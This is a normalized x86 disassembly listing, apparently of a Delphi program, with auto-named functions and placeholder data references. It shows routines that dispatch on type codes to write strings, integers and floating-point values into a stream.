xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415358
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_403464
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f343
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4152d8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_413f80
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d8
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_413ff4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f34a
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40499c
retn
sub_41f354
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41edb8
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f416 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414a84
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push ebp
call sub_41ede8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41ee40
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41eef4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f01c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f244
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f2bc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41ee9c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f168
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414a84
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f4bc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f504
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404184
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4202cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f50b
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41f510
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41f596
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4147fc
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_420508
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414808
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420320
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f59d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41f5a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41f604
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_417c5c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41ebd0
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41eb0c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f60b
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_41f610
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f6a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403fb8
xor eax eax
push ebp
push sub_41f689
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_403f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f690
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_403f74
retn
sub_41f6b4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f768
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414a84
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41f5a4
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f76f
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e3e8
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414808
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eb0c
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41f510
pop ecx
jmp r-xdata
jmp r-xdata
sub_41f774
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414fb4
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ea7c
mov esp ebp
pop ebp
retn
sub_41f7b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4153d0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ec44
pop ecx
pop ecx
pop ebp
retn
sub_41f7f0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f845
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414df8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f84c
lea eax [ ebp - 0x4 ]
call sub_404600
retn
sub_41f868
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f74
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f95e
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403f20
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_40422c
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41f850
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4042a0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41f868
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4042a0
jmp r-xdata
sub_41f990
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fb84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414a84
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420508
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb8b
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f44
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403fb8
xor eax eax
push ebp
push sub_41fb05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404184
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4042a0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41ecf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_403f74
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414a84
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41f868
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41eb0c
jmp r-xdata
sub_41fb9c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fc59
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415434
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d1e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420508
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc60
lea eax [ ebp - 0xc ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_40578c
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41f868
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41eb0c
sub_41fc78
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fd13
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415358
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_403464
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_404184
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eb0c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420508
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd1a
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_41fd20
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fd79
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152d8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4bc
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41fed0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd80
lea eax [ ebp - 0x10 ]
call sub_40eecc
retn
sub_41fd84
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_42051c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f354
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41edb8
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414a84
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41fe42 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414a84
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41f6b4
pop ecx
jmp r-xdata
push ebp
call sub_41f774
pop ecx
jmp r-xdata
push ebp
call sub_41f7f0
pop ecx
jmp r-xdata
push ebp
call sub_41f990
pop ecx
jmp r-xdata
push ebp
call sub_41fc78
pop ecx
jmp r-xdata
push ebp
call sub_41fd20
pop ecx
jmp r-xdata
push ebp
call sub_41f7b4
pop ecx
jmp r-xdata
push ebp
call sub_41fb9c
pop ecx
sub_41fed0
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4202ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4140d4
test al al
je r-xdata
mov eax ebx
call sub_413f6c
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_4111c0
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41eae8
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40f870
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ebd0
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_4128f8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420454
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202b3
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x34 ]
call sub_40578c
lea eax [ ebp - 0x30 ]
call sub_403f20
lea eax [ ebp - 0x2c ]
call sub_404600
lea eax [ ebp - 0x1c ]
call sub_40578c
retn
xor eax eax
push ebp
push sub_420250
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_4143cc
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41ff4e ]
mov eax ebx
call sub_410334
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41ec44
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410c78
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_4121d0
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_420400
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_40578c
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_412ed0
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d1e0
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_420508
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420508
jmp r-xdata
mov eax ebx
call sub_4111c0
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41eaa0
jmp r-xdata
mov eax ebx
call sub_4111c0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ea7c
jmp r-xdata
mov eax ebx
call sub_411b1c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41eac4
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_4121d0
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_420400
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_420508
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_420508
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42023f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b2b4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4201e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030e0
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_404184
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_420400
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e2e8
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e2e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4201ec
mov eax [ ebp - 0x14 ]
call sub_403190
retn
sub_4201ec
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov dl 0xa
mov eax [ ebp - 0x4 ]
call sub_420508
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41e2e8
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41e2e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403190
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_4202cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420312
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx [ ebx + 0x2c ]
call sub_40422c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420319
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_420320
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4041e0
mov [ esp ] eax
cmp [ esp ] 0xff
jle r-xdata
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e2e8
mov eax esi
call sub_4043e0
mov edx eax
mov ecx [ esp ]
mov eax ebx
call sub_41e2e8
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xff
sub_420368
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_40432c
je r-xdata
mov eax esi
call sub_4041e0
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4041e0
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_420508
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e2e8
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41e2e8
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_420508
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e2e8
mov dl 0x6
mov eax ebx
call sub_420508
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e2e8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41e2e8
sub_420400
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420445
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c00
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_420368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42044c
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_420454
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4204fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_405ab0
mov eax [ ebp - 0x8 ]
call sub_4041e0
mov edi eax
mov eax ebx
call sub_40476c
add eax eax
cmp edi eax
jge r-xdata
mov dl 0x12
mov eax esi
call sub_420508
mov eax ebx
call sub_40476c
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax esi
